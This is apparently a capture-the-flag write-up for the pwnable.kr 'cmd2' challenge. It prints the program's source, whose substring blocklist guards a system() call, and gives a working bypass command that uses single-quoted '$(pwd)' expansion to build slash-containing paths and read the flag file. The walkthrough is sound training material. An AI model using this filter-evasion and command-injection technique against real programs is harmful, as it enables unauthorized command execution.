# pwnable.kr -- Toddler's Bottle -- cmd2
This is an anvanced challenge of `cmd1`. The program filters more words, but it still can be solved.

## 1. Challenge
  > Daddy bought me a system command shell.  
  > but he put some filters to prevent me from playing with it without his permission...  
  > but I wanna play anytime I want!  
  >   
  > ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)  

## 2. Solution
  * Connect target and see the source code. But this time, you'd pay attention to the login password. The password is the flag of `cmd1` challenge. I will never tell flags in this repository, so you'd better to solve `cmd1` challenge first. Here is the source code of cmd2:
    ```c
    #include <stdio.h>
    #include <string.h>

    int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
    }

    extern char** environ;
    void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
    }

    int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
    }

    ```

  * You can find there are more substrings or characters filtered including the most important `"/"`. There is still one way to make character `"/"` shown in `system(argv[1])`.

  * If we go back to `"/"` directory and type:
    ```c
    $ echo $(pwd)
    ```
    you can get a `"/"` character. So that means `"$(pwd)"` is escaped to `"/"`. However if you directly pass it to program `cmd2`, it still will be filtered. So we must insure that `"$(pwd)"` shall not be escaped while passing arguments.

  * One of solutions is to use a pair of single quote marks wrap the argument like this:
    ```bash
    $ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
    ```
    then you can see the flag.
